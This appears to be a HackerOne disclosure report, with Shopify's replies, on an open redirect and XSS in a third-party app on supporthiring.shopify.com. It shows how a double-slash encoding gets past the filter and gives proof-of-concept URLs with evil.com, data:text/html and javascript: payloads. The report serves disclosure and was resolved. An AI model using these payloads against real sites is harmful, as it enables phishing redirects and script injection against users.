title: (BYPASS) Open redirect and XSS in supporthiring.shopify.com

profile.name: Shopify
profile.about: Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.

vulnerability_information:
Hello,

The users can be redirected to some other site which is in control of the attacker from 

Vulnerable parameter: path=

You have a protection here at path= but it bypass the parameter if you add a double slash, like %2F%2F.

Let's say user is attacker asked victim to came to this page: :
http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-challenge?&path=%2F%2Fevil.com

Victim will be see a 404 error page and after 2 seconds he will be redirected to: https://evil.com

These can be controlled by the attacker and used in other attacks

Works in all browsers!!

activities.message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Our team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!

While you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!

activities.message:
I want to recommed you guys to look this quick, this can be urgent. It is possible on almost every page at http://supporthiring.shopify.com

Works also here:
http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-book-a-time?&path=%2F%2Fevil.com
http://supporthiring.shopify.com/apps/locksmith/resource/pages/life-story-bc-ireland?&path=%2F%2Fevil.com
http://supporthiring.shopify.com/apps/locksmith/resource/pages/life-story-on-nb?&path=%2F%2Fevil.com
http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-resources?&path=%2F%2Fevil.com
https://supporthiring.shopify.com/apps/locksmith/resource/pages/life-story-on-nb?&path=%2F%2Fevil.com

activities.message:
XSS is here also possible!  So the XSS and open redirect are possible in almost every page.

http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-challenge?&path=data%3Atext%2fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgvWFNTIFBvQy8pPC9zY3JpcHQ%2b

activities.message: Thank you for your report. Our engineering team is investigating the issue.
activities.markdown_message: Thank you for your report. Our engineering team is investigating the issue.

activities.message:
Here a clean POC: http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-challenge?&path=javascript:alert(document.domain)

Will popup a XSS with your domain name. This affects a lots of pages at supporthiring.shopify, so a attacker has full control at that page

activities.message: Could you guys change the title of this report? Because it isnt only a open redirect but also a XSS.

activities.message: This issue is fixed! I am not able to reproduce this issue anytime more.

additional_data.new_title: (BYPASS) Open redirect and XSS in supporthiring.shopify.com

activities.message:
Thanks again for your report. It turned out that the vulnerability was in a third-party application installed on supporthiring.shopify.com, so we worked with the developer of that application to resolve the issue. Even though supporthiring.shopify.com is out of scope for our white hat program, this issue also affected other in-scope sites, and so this report will be eligible for a bounty.

Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.
activities.markdown_message:
Thanks again for your report. It turned out that the vulnerability was in a third-party application installed on supporthiring.shopify.com, so we worked with the developer of that application to resolve the issue. Even though supporthiring.shopify.com is out of scope for our white hat program, this issue also affected other in-scope sites, and so this report will be eligible for a bounty.

Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.

activities.message: Thanks for helping improve the security of Shopify! As you noted, this issue has been resolved.
activities.markdown_message: Thanks for helping improve the security of Shopify! As you noted, this issue has been resolved.
